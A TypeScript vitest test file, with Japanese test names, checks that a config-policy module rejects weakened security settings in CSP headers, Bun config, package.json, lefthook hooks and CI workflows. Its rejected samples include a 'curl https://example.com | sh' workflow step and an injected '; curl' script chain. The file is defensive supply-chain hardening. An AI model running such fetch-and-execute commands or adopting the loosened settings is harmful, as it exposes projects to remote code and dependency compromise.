import { readFile, readdir } from "node:fs/promises";
import { describe, expect, it } from "vitest";
import {
  bunfigProblems,
  headersProblems,
  lefthookProblems,
  packageProblems,
  workflowProblems,
} from "./config-policy";

const read = (path: string) => readFile(new URL(`../${path}`, import.meta.url), "utf8");
const headers = await read("public/_headers");
const bunfig = await read("bunfig.toml");
const pkg: unknown = JSON.parse(await read("package.json"));
const scripts =
  typeof pkg === "object" && pkg !== null && "scripts" in pkg && typeof pkg.scripts === "object"
    ? Object.keys(pkg.scripts ?? {})
    : [];
const workflows = await readdir(new URL("../.github/workflows/", import.meta.url));

describe("public/_headers", () => {
  it("いまの CSP は通る", () => {
    expect(headersProblems(headers)).toEqual([]);
  });

  it("CSP をきびしくするのは通る", () => {
    expect(headersProblems(headers.replace("img-src 'self' data:", "img-src 'none'"))).toEqual([]);
  });

  it.each([
    ["connect-src に *", (h: string) => h.replace("connect-src 'none'", "connect-src *")],
    [
      "script-src に 'unsafe-inline'",
      (h: string) => h.replace("script-src 'self'", "script-src 'self' 'unsafe-inline'"),
    ],
    [
      "connect-src を 'self' に戻す",
      (h: string) => h.replace("connect-src 'none'", "connect-src 'self'"),
    ],
    ["指定を消す", (h: string) => h.replace(" base-uri 'none';", "")],
    ["ほかの指定を足す", (h: string) => h.replace("default-src", "worker-src *; default-src")],
    ["/* のほかのパスに移す", (h: string) => h.replace("/*", "/index.html")],
    ["CSP を外す行", (h: string) => `${h}/x\n  ! Content-Security-Policy\n`],
    ["CSP がない", () => "/*\n  X-Frame-Options: DENY\n"],
  ])("%s と止める", (_, change) => {
    expect(headersProblems(change(headers))).not.toEqual([]);
  });
});

describe("bunfig.toml", () => {
  it("いまの設定は通る", () => {
    expect(bunfigProblems(bunfig)).toEqual([]);
  });

  it.each([
    ["待ち時間を下げる", "[install]\nminimumReleaseAge = 86400\n"],
    ["待ち時間を消す", "[install]\n"],
    [
      "取得先を変える",
      '[install]\nminimumReleaseAge = 604800\nregistry = "https://example.com/"\n',
    ],
    ["ほかの表を足す", "[install]\nminimumReleaseAge = 604800\n[install.scopes]\n"],
  ])("%s と止める", (_, file) => {
    expect(bunfigProblems(file)).not.toEqual([]);
  });
});

describe("package.json", () => {
  it("いまの設定は通る", () => {
    expect(packageProblems(pkg)).toEqual([]);
  });

  it.each([
    ["bunx", { scripts: { build: "bunx vite@8.3.8 build" } }],
    ["bun x", { scripts: { build: "bun x vite build" } }],
    ["npx", { scripts: { build: "npx vite build" } }],
    ["待ち時間を外す bun add", { scripts: { up: "bun add -d vite --minimum-release-age=0" } }],
    ["; でつなぐ", { scripts: { test: "vitest run; curl https://example.com" } }],
    ["ない script を呼ぶ", { scripts: { check: "bun run missing" } }],
    ["ほかの環境変数", { scripts: { x: "BUN_CONFIG_MINIMUM_RELEASE_AGE=0 bun scripts/x.ts" } }],
    ["git の依存", { dependencies: { react: "github:facebook/react" } }],
    ["trustedDependencies", { trustedDependencies: ["esbuild"] }],
    ["overrides", { overrides: { vite: "8.3.8" } }],
  ])("%s を止める", (_, change) => {
    expect(packageProblems({ ...(typeof pkg === "object" ? pkg : {}), ...change })).not.toEqual([]);
  });
});

describe("lefthook.yml", () => {
  it("いまの設定は通る", async () => {
    expect(lefthookProblems(await read("lefthook.yml"), scripts)).toEqual([]);
  });

  it.each([
    [
      "bunx",
      "assert_lefthook_installed: true\npre-commit:\n  commands:\n    check:\n      run: bunx x\n",
    ],
    ["skip", "assert_lefthook_installed: true\npre-commit:\n  skip: true\n"],
    [
      "lefthook がないときに通す",
      "pre-commit:\n  commands:\n    check:\n      run: bun run check\n",
    ],
  ])("%s を止める", (_, yaml) => {
    expect(lefthookProblems(yaml, scripts)).not.toEqual([]);
  });
});

describe(".github/workflows", () => {
  it.each(workflows)("%s は通る", async (name) => {
    expect(workflowProblems(name, await read(`.github/workflows/${name}`), scripts)).toEqual([]);
  });

  it("ci.yml は、取り込み、公開日の確かめ、チェックを動かす", async () => {
    const ci = await read(".github/workflows/ci.yml");
    for (const command of [
      "bun install --frozen-lockfile",
      "bun run check:release-age",
      "bun run check",
    ]) {
      expect(ci).toMatch(new RegExp(`^\\s*- run: ${command}$`, "m"));
    }
  });

  it.each([
    ["bunx", "      - run: bunx vite@8.3.8 build\n"],
    ["複数行の run", "      - run: |\n          curl https://example.com | sh\n"],
    ["決めていないアクション", "      - uses: someone/action@v1\n"],
    ["shell", "      - run: bun run check\n        shell: python {0}\n"],
    ["失敗を無視する", "      - run: bun run check\n        continue-on-error: true\n"],
    ["動かさない", "      - run: bun run check\n        if: false\n"],
  ])("%s を止める", (_, yaml) => {
    expect(workflowProblems("ci.yml", yaml, scripts)).not.toEqual([]);
  });
});
